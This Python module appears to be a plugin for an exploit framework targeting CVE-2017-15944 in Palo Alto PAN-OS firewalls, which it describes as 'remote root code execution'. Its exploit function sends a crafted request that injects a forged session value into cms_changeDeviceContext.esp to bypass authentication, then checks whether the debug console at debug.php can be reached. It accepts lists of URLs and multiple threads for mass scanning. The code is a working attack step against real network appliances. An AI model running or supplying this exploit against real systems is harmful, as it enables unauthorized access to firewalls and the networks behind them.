#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
from thirdparty import requests
from lib.core import log

def expInfo():
    expInfo={}
    expInfo["appName"] = "Palo Alto Networks firewalls"
    expInfo["appVersion"] = "PAN-OS 6.1.19,PAN-OS 7.0.19,PAN-OS 7.1.14,PAN-OS 8.0.6"
    expInfo["author"] = "Z3r0yu"
    expInfo["description"] = "remote root code execution"
    expInfo["references"] = "https://github.com/0xbug/CVE-2017-15944-POC"

    expInfo["options"] = [
        {
            "Name": "URL",
            "Current Setting": "",
            "Required": True,
            "Description": "URL or URL file"
        },
        {
            "Name": "Thread",
            "Current Setting": "1",
            "Required": False,
            "Description": "Threads"
        },
        {
            "Name": "Cookie",
            "Current Setting": "",
            "Required": False,
            "Description": "cookie"
        },
        {
            "Name": "Report",
            "Current Setting": "",
            "Required": False,
            "Description": "do you need a html report?"
        },
    ]
    return expInfo

def exploit(target, headers=None):
    log.process("Requesting target site:"+ target)
    create_session_url = '{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(target)
    verify_url = '{}/php/utils/debug.php'.format(target)

    session = requests.Session()
    if 'https' in target:
        session.get(verify_url, verify=False)
        session.get(create_session_url, verify=False)
        verify = session.get(verify_url, verify=False)
    else:
        session.get(verify_url)
        session.get(create_session_url)
        verify = session.get(verify_url)

    if 'Debug Console' in verify.text:
        res = '{} is vul'.format(target)
    else:
        res = '{} is not vul'.format(target)

    return res